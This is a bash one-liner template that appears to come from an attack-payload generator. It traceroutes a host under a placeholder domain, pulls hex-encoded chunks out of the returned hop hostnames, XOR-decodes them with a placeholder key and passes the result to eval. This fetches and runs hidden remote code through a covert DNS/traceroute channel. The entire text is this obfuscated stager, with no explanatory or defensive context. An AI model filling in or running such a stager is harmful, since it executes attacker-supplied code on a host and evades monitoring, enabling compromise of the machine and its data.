z={{DOMAIN_ZONE}};t=$(traceroute payload.$z 2>&1);k=({{KEY_SPACE}});h=$(echo "$t"|grep -oP '\S+(?=\.'"$z"')'|grep -viE '^(end|empty|payload)$'|while IFS= read -r p; do echo "$p"|tr '.' '\n'|grep -E '^[0-9a-fA-F]+$'|while read -r lbl; do [ $((${#lbl}%2)) -eq 0 ] && printf "%s" "$lbl"; done; done);[ -n "$h" ]&&eval "$(i=0;while [ $i -lt ${#h} ];do v=$((16#${h:$i:2}));printf "\\x$(printf '%02x' $((v^k[i/2%4])))";((i+=2));done)"
